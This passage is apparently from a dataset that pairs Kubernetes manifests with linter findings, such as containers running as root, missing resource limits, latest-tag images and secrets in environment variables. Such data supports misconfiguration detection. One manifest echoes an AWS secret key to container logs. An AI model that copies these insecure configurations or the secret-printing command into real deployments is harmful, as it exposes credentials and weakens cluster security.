    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apm-eureka\" is not set to runAsNonRoot"
  },
  {
    "id": "03808",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sidecar\" is not set to runAsNonRoot"
  },
  {
    "id": "03809",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apm-eureka\" has cpu request 0"
  },
  {
    "id": "03810",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sidecar\" has cpu request 0"
  },
  {
    "id": "03811",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apm-eureka\" has memory limit 0"
  },
  {
    "id": "03812",
    "manifest_path": "data/manifests/the_stack_sample/sample_1696.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-eureka\n  labels:\n    deploy: apm-eureka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-eureka\n  template:\n    metadata:\n      name: apm-eureka\n      labels:\n        app: apm-eureka\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-eureka\n        image: evanxuhe/apm-eureka:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-eureka\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo\n        ports:\n        - name: http\n          containerPort: 8761\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sidecar\" has memory limit 0"
  },
  {
    "id": "03813",
    "manifest_path": "data/manifests/the_stack_sample/sample_1697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.1.51\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: e0f23ac6addb6dce6a649e73f5c7584203878aee72cf33274a296a208bedc454\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.1.51\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: zpzjzj\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.51\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 78ee09edfc1815a0057f1df4a3749b0dba55c117\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "03814",
    "manifest_path": "data/manifests/the_stack_sample/sample_1697.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.1.51\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: e0f23ac6addb6dce6a649e73f5c7584203878aee72cf33274a296a208bedc454\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.1.51\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: zpzjzj\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.51\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 78ee09edfc1815a0057f1df4a3749b0dba55c117\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "03815",
    "manifest_path": "data/manifests/the_stack_sample/sample_1699.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  volumes:\n  - name: persistentsharedspace\n    persistentVolumeClaim:\n      claimName: my-pv-claim\n  containers:\n  - name: nginx\n    image: nginx:1.7.9\n    volumeMounts:\n    - mountPath: /containerMount\n      name: persistentsharedspace\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03816",
    "manifest_path": "data/manifests/the_stack_sample/sample_1699.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  volumes:\n  - name: persistentsharedspace\n    persistentVolumeClaim:\n      claimName: my-pv-claim\n  containers:\n  - name: nginx\n    image: nginx:1.7.9\n    volumeMounts:\n    - mountPath: /containerMount\n      name: persistentsharedspace\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03817",
    "manifest_path": "data/manifests/the_stack_sample/sample_1699.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  volumes:\n  - name: persistentsharedspace\n    persistentVolumeClaim:\n      claimName: my-pv-claim\n  containers:\n  - name: nginx\n    image: nginx:1.7.9\n    volumeMounts:\n    - mountPath: /containerMount\n      name: persistentsharedspace\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03818",
    "manifest_path": "data/manifests/the_stack_sample/sample_1699.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  volumes:\n  - name: persistentsharedspace\n    persistentVolumeClaim:\n      claimName: my-pv-claim\n  containers:\n  - name: nginx\n    image: nginx:1.7.9\n    volumeMounts:\n    - mountPath: /containerMount\n      name: persistentsharedspace\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03819",
    "manifest_path": "data/manifests/the_stack_sample/sample_1702.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: cntr-apache\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cntr-apache\" is using an invalid container image, \"httpd:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03820",
    "manifest_path": "data/manifests/the_stack_sample/sample_1702.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: cntr-apache\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cntr-apache\" does not have a read-only root file system"
  },
  {
    "id": "03821",
    "manifest_path": "data/manifests/the_stack_sample/sample_1702.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: cntr-apache\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cntr-apache\" is not set to runAsNonRoot"
  },
  {
    "id": "03822",
    "manifest_path": "data/manifests/the_stack_sample/sample_1702.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: cntr-apache\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cntr-apache\" has cpu request 0"
  },
  {
    "id": "03823",
    "manifest_path": "data/manifests/the_stack_sample/sample_1702.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-web\n  labels:\n    app: web\nspec:\n  containers:\n  - name: cntr-apache\n    image: httpd:latest\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cntr-apache\" has memory limit 0"
  },
  {
    "id": "03824",
    "manifest_path": "data/manifests/the_stack_sample/sample_1704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: github-actions-runner-controller-registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: github-actions-runner-controller-registry\n  template:\n    metadata:\n      labels:\n        app: github-actions-runner-controller-registry\n    spec:\n      containers:\n      - name: registry\n        image: registry:2\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/registry\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"registry\" does not have a read-only root file system"
  },
  {
    "id": "03825",
    "manifest_path": "data/manifests/the_stack_sample/sample_1704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: github-actions-runner-controller-registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: github-actions-runner-controller-registry\n  template:\n    metadata:\n      labels:\n        app: github-actions-runner-controller-registry\n    spec:\n      containers:\n      - name: registry\n        image: registry:2\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/registry\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"registry\" is not set to runAsNonRoot"
  },
  {
    "id": "03826",
    "manifest_path": "data/manifests/the_stack_sample/sample_1704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: github-actions-runner-controller-registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: github-actions-runner-controller-registry\n  template:\n    metadata:\n      labels:\n        app: github-actions-runner-controller-registry\n    spec:\n      containers:\n      - name: registry\n        image: registry:2\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/registry\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"registry\" has cpu request 0"
  },
  {
    "id": "03827",
    "manifest_path": "data/manifests/the_stack_sample/sample_1704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: github-actions-runner-controller-registry\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: github-actions-runner-controller-registry\n  template:\n    metadata:\n      labels:\n        app: github-actions-runner-controller-registry\n    spec:\n      containers:\n      - name: registry\n        image: registry:2\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/registry\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"registry\" has memory limit 0"
  },
  {
    "id": "03828",
    "manifest_path": "data/manifests/the_stack_sample/sample_1706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: nginx-ingress-operator\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-operator\n    spec:\n      serviceAccountName: nginx-ingress-operator\n      containers:\n      - name: nginx-ingress-operator\n        image: nginx/nginx-ingress-operator:latest\n        command:\n        - nginx-ingress-operator\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: nginx-ingress-operator\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-ingress-operator\" is using an invalid container image, \"nginx/nginx-ingress-operator:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03829",
    "manifest_path": "data/manifests/the_stack_sample/sample_1706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: nginx-ingress-operator\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-operator\n    spec:\n      serviceAccountName: nginx-ingress-operator\n      containers:\n      - name: nginx-ingress-operator\n        image: nginx/nginx-ingress-operator:latest\n        command:\n        - nginx-ingress-operator\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: nginx-ingress-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-operator\" does not have a read-only root file system"
  },
  {
    "id": "03830",
    "manifest_path": "data/manifests/the_stack_sample/sample_1706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: nginx-ingress-operator\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-operator\n    spec:\n      serviceAccountName: nginx-ingress-operator\n      containers:\n      - name: nginx-ingress-operator\n        image: nginx/nginx-ingress-operator:latest\n        command:\n        - nginx-ingress-operator\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: nginx-ingress-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "03831",
    "manifest_path": "data/manifests/the_stack_sample/sample_1706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: nginx-ingress-operator\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-operator\n    spec:\n      serviceAccountName: nginx-ingress-operator\n      containers:\n      - name: nginx-ingress-operator\n        image: nginx/nginx-ingress-operator:latest\n        command:\n        - nginx-ingress-operator\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: nginx-ingress-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-operator\" has cpu request 0"
  },
  {
    "id": "03832",
    "manifest_path": "data/manifests/the_stack_sample/sample_1706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-ingress-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: nginx-ingress-operator\n  template:\n    metadata:\n      labels:\n        name: nginx-ingress-operator\n    spec:\n      serviceAccountName: nginx-ingress-operator\n      containers:\n      - name: nginx-ingress-operator\n        image: nginx/nginx-ingress-operator:latest\n        command:\n        - nginx-ingress-operator\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: nginx-ingress-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-operator\" has memory limit 0"
  },
  {
    "id": "03833",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable AWS_SECRET_ACCESS_KEY in container \"app\" found"
  },
  {
    "id": "03834",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable AWS_SECRET_ACCESS_KEY in container \"init-ubuntu\" found"
  },
  {
    "id": "03835",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03836",
    "manifest_path": "data/manifests/the_stack_sample/sample_1711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\n  namespace: app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: app\n      annotations:\n        vault.security.banzaicloud.io/vault-addr: https://vault.vault:8200\n        vault.security.banzaicloud.io/vault-tls-secret: vault-tls\n    spec:\n      initContainers:\n      - name: init-ubuntu\n        image: ubuntu\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo initContainers ready\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#${.AWS_SECRET_ACCESS_KEY}\n      containers:\n      - name: app\n        image: alpine\n        command:\n        - sh\n        - -c\n        - echo $AWS_SECRET_ACCESS_KEY && echo going to sleep... && sleep 10000\n        env:\n        - name: AWS_SECRET_ACCESS_KEY\n          value: vault:secret/data/accounts/aws#AWS_SECRET_ACCESS_KEY\n",
    "policy_id": "latest-tag",
